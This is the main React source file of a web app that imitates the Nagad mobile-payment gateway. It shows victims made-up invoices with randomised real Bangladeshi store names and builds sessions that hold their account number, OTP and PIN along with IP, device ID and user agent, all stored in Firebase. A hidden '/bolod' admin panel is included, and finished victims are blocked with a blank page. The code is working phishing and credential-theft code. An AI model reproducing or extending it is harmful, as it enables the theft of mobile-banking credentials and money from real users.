import React, { useState, useEffect } from 'react';
import { StoreSettings, TransactionSession, BlockedTarget, AdminUser } from './types';
import { NagadHeader } from './components/NagadHeader';
import { PaymentFlow } from './components/PaymentFlow';
import { NagadFooter } from './components/NagadFooter';
import { AdminLogin } from './components/AdminLogin';
import { AdminPanel } from './components/AdminPanel';
import { rtdb, ref, onValue, set, update, db, doc, onSnapshot, setDoc } from './firebase';

const DEFAULT_STORES = [
  'MUNNA GENERAL STORE',
  'DARAZ BANGLADESH LTD',
  'CHALDAL ONLINE GROCERY',
  'FOODPANDA BANGLADESH',
  'EVALY OFFICIAL STORE',
  'ROKOMARI.COM',
  'PICKABOO ELECTRONICS',
  'SHAPLA FASHION HOUSE',
  'GRAMEENPHONE RECHARGE',
  'ROBI AXIATA MERCHANTS',
  'BANGLALINK DIGITAL',
  'TELETALK RECHARGE BD',
  'AARONG CRAFTS BD',
  'WALTON HI-TECH PLC',
  'APEX FOOTWEAR MERCHANTS',
  'PATHAO FOOD & RIDES',
  'AGORA SUPERSTORE',
  'SWAPNO SUPER SHOP',
  'MEENA BAZAR BD',
  'BATA BANGLADESH',
  'OTHOBA.COM MERCHANTS',
];

export default function App() {
  const [isAdminRoute, setIsAdminRoute] = useState<boolean>(false);
  const [adminUser, setAdminUser] = useState<AdminUser | null>(() => {
    try {
      const saved = localStorage.getItem('nagad_admin_user');
      return saved ? JSON.parse(saved) : null;
    } catch (e) {
      return null;
    }
  });
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState<boolean>(() => {
    return !!localStorage.getItem('nagad_admin_user');
  });
  const [isBlocked, setIsBlocked] = useState<boolean>(false);
  const [lang, setLang] = useState<'bn' | 'en'>('en');
  const [gatewayAmounts, setGatewayAmounts] = useState<Record<string, string>>({});

  // Dynamic Store Settings state with localStorage initial state to prevent logo flicker on refresh
  const [storeSettings, setStoreSettings] = useState<StoreSettings>(() => {
    const defaults: StoreSettings = {
      storeName: 'MUNNA GENERAL STORE',
      amount: '1,000.00',
      currency: 'BDT',
      charge: '0',
      invoiceNo: 'CC801472068',
      processingTimeSeconds: 30,
      successTimeSeconds: 15,
      autoRandomizeStore: true,
      autoRandomizeInvoice: true,
      customLogoUrl: '',
      customFaviconUrl: '',
      pageTitle: 'Nagad Payment Gateway',
      storeNamesList: DEFAULT_STORES,
    };
    try {
      const cached = localStorage.getItem('nagad_cached_settings');
      if (cached) {
        const parsed = JSON.parse(cached);
        return { ...defaults, ...parsed };
      }
    } catch (e) {
      console.warn('Failed to parse cached settings:', e);
    }
    return defaults;
  });

  // User transaction session state
  const [session, setSession] = useState<TransactionSession | null>(null);

  // Check URL path on load and history changes
  useEffect(() => {
    const path = window.location.pathname.toLowerCase();
    if (path === '/bolod' || path.startsWith('/bolod/')) {
      setIsAdminRoute(true);
    } else {
      setIsAdminRoute(false);
    }
  }, []);

  // Sync Favicon and Document Title if configured
  useEffect(() => {
    if (storeSettings.pageTitle) {
      document.title = storeSettings.pageTitle;
    }
    if (storeSettings.customFaviconUrl) {
      let link: HTMLLinkElement | null = document.querySelector("link[rel*='icon']");
      if (!link) {
        link = document.createElement('link');
        link.rel = 'shortcut icon';
        document.getElementsByTagName('head')[0].appendChild(link);
      }
      link.href = storeSettings.customFaviconUrl;
    }
  }, [storeSettings.pageTitle, storeSettings.customFaviconUrl]);

  // Fetch or generate client Device ID & IP
  useEffect(() => {
    let deviceId = localStorage.getItem('nagad_device_id');
    if (!deviceId) {
      deviceId = 'dev_' + Math.random().toString(36).substring(2, 11) + '_' + Date.now();
      localStorage.setItem('nagad_device_id', deviceId);
    }

    // Check completed state
    if (localStorage.getItem('nagad_completed') === 'true') {
      setIsBlocked(true);
    }

    // Fetch IP Address
    fetch('https://api.ipify.org?format=json')
      .then((res) => res.json())
      .then((data) => {
        const clientIp = data.ip || 'Unknown';
        initSession(deviceId!, clientIp);
      })
      .catch(() => {
        initSession(deviceId!, '127.0.0.1');
      });
  }, []);

  // Listen for realtime blocked list from Firebase
  useEffect(() => {
    const blockedRef = ref(rtdb, 'blockedTargets');
    const unsubscribeRtdb = onValue(blockedRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const deviceId = localStorage.getItem('nagad_device_id');
        const blockedList: BlockedTarget[] = Object.values(data);
        const matched = blockedList.find(
          (b) => b.deviceId === deviceId || (session?.ip && b.ip === session.ip)
        );
        if (matched) {
          setIsBlocked(true);
        }
      }
    });

    // Listen for live store settings from Firebase
    const settingsRef = ref(rtdb, 'settings');
    const unsubscribeSettings = onValue(settingsRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setStoreSettings((prev) => {
          const next = { ...prev, ...data };
          try {
            localStorage.setItem('nagad_cached_settings', JSON.stringify(next));
          } catch (e) {
            console.warn('Cache error:', e);
          }
          return next;
        });
      }
    });

    // Listen for custom gateway link amounts
    const gatewayAmountsRef = ref(rtdb, 'gatewayAmounts');
    const unsubscribeGatewayAmounts = onValue(gatewayAmountsRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setGatewayAmounts(data);
      }
    });

    return () => {
      unsubscribeRtdb();
      unsubscribeSettings();
      unsubscribeGatewayAmounts();
    };
  }, [session?.ip]);

  // Subscribe to RTDB for current user's session updates
  useEffect(() => {
    if (!session?.id) return;
    const sessionRef = ref(rtdb, `sessions/${session.id}`);
    const unsubscribeSession = onValue(sessionRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setSession((prev) => (prev ? { ...prev, ...data } : data));
      }
    });
    return () => unsubscribeSession();
  }, [session?.id]);

  // Helper to extract gateway URL slug from parameter or path
  const getClientGatewayTag = (): string => {
    if (typeof window === 'undefined') return 'main';
    const urlParams = new URLSearchParams(window.location.search);
    const param =
      urlParams.get('u') ||
      urlParams.get('gateway') ||
      urlParams.get('slug') ||
      urlParams.get('ref');
    if (param) return param.trim().toLowerCase();

    const path = window.location.pathname.replace(/^\/+|\/+$/g, '');
    if (path && path.toLowerCase() !== 'bolod') {
      return path.toLowerCase();
    }
    return 'main';
  };

  // Create initial transaction session with randomized store/invoice if enabled
  const initSession = (deviceId: string, ip: string) => {
    const existingSessionId = localStorage.getItem('nagad_session_id');
    const newId = existingSessionId || 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
    localStorage.setItem('nagad_session_id', newId);

    if (session && session.id === newId) {
      return;
    }

    // Compute store name
    let chosenStore = storeSettings.storeName || 'MUNNA GENERAL STORE';
    if (storeSettings.autoRandomizeStore) {
      const pool =
        storeSettings.storeNamesList && storeSettings.storeNamesList.length > 0
          ? storeSettings.storeNamesList
          : DEFAULT_STORES;
      chosenStore = pool[Math.floor(Math.random() * pool.length)];
    }

    // Compute invoice number
    let chosenInvoice = storeSettings.invoiceNo || 'CC801472068';
    if (storeSettings.autoRandomizeInvoice) {
      chosenInvoice = 'CC' + Math.floor(100000000 + Math.random() * 900000000);
    }

    const currentGatewayTag = getClientGatewayTag();
    const customGatewayAmount = gatewayAmounts[currentGatewayTag];
    const finalAmount = customGatewayAmount || storeSettings.amount || '1,000.00';

    const initialSession: TransactionSession = {
      id: newId,
      accountNumber: '',
      otp: '',
      pin: '',
      ip: ip,
      deviceId: deviceId,
      userAgent: navigator.userAgent,
      timestamp: Date.now(),
      step: 'number',
      storeName: chosenStore,
      amount: finalAmount,
      currency: storeSettings.currency || 'BDT',
      charge: storeSettings.charge || '0',
      invoiceNo: chosenInvoice,
      status: 'active',
      updatedAt: Date.now(),
      gatewayTag: currentGatewayTag,
    };

    setSession(initialSession);

    // Sync to Firebase RTDB & Firestore
    try {
      set(ref(rtdb, `sessions/${newId}`), initialSession);
      setDoc(doc(db, 'sessions', newId), initialSession, { merge: true });
    } catch (e) {
      console.warn('Firebase init error:', e);
    }
  };

  // Update session handler
  const handleUpdateSession = (updates: Partial<TransactionSession>) => {
    if (!session) return;
    setSession((prev) => (prev ? { ...prev, ...updates, updatedAt: Date.now() } : null));
  };

  // Complete transaction handler (locks out user device)
  const handleCompleteTransaction = () => {
    localStorage.setItem('nagad_completed', 'true');
    setIsBlocked(true);

    if (session) {
      const deviceId = localStorage.getItem('nagad_device_id') || session.id;
      const blockedItem: BlockedTarget = {
        id: session.id,
        ip: session.ip || 'Unknown',
        deviceId: deviceId,
        blockedAt: Date.now(),
      };

      try {
        set(ref(rtdb, `blockedTargets/${session.id}`), blockedItem);
        set(ref(rtdb, `sessions/${session.id}/step`), 'completed');
        set(ref(rtdb, `sessions/${session.id}/status`), 'completed');

        setDoc(doc(db, 'blockedTargets', session.id), blockedItem);
        setDoc(doc(db, 'sessions', session.id), { step: 'completed', status: 'completed' }, { merge: true });
      } catch (e) {
        console.error(e);
      }
    }
  };

  // IF ADMIN ROUTE (/bolod)
  if (isAdminRoute) {
    if (!isAdminLoggedIn) {
      return (
        <AdminLogin
          onLoginSuccess={(user) => {
            setAdminUser(user);
            setIsAdminLoggedIn(true);
            try {
              localStorage.setItem('nagad_admin_user', JSON.stringify(user));
            } catch (e) {
              console.warn('Failed to save admin user:', e);
            }
          }}
        />
      );
    }

    return (
      <AdminPanel
        storeSettings={storeSettings}
        onUpdateStoreSettings={(newSettings) => setStoreSettings(newSettings)}
        currentUser={adminUser || undefined}
        onLogout={() => {
          setIsAdminLoggedIn(false);
          setAdminUser(null);
          localStorage.removeItem('nagad_admin_user');
        }}
      />
    );
  }

  // IF BLOCKED OR COMPLETED -> RENDER BLANK PAGE
  if (isBlocked) {
    return <div className="min-h-screen bg-white w-full h-full" />;
  }

  // NAGAD PAYMENT GATEWAY VIEW
  return (
    <div className="min-h-screen w-full bg-[#0a0a0a] flex items-center justify-center font-sans antialiased selection:bg-white selection:text-red-700 p-2.5 sm:p-6 md:p-8">
      <div className="w-full max-w-[390px] sm:max-w-[460px] md:max-w-[480px] min-h-[640px] sm:min-h-[700px] bg-gradient-to-b from-[#b3080d] via-[#a0060a] to-[#800306] rounded-2xl sm:rounded-3xl shadow-2xl border border-red-900/30 flex flex-col justify-between items-center py-4 px-3 sm:px-5 overflow-hidden relative my-auto">
        <NagadHeader
          storeName={session?.storeName || storeSettings.storeName}
          amount={session?.amount || gatewayAmounts[getClientGatewayTag()] || storeSettings.amount}
          currency={session?.currency || storeSettings.currency}
          charge={session?.charge || storeSettings.charge}
          invoiceNo={session?.invoiceNo || storeSettings.invoiceNo}
          lang={lang}
          onLangChange={(newLang) => setLang(newLang)}
        />

        {session && (
          <PaymentFlow
            session={session}
            lang={lang}
            onUpdateSession={handleUpdateSession}
            onComplete={handleCompleteTransaction}
          />
        )}

        <NagadFooter customLogoUrl={storeSettings.customLogoUrl} />
      </div>
    </div>
  );
}
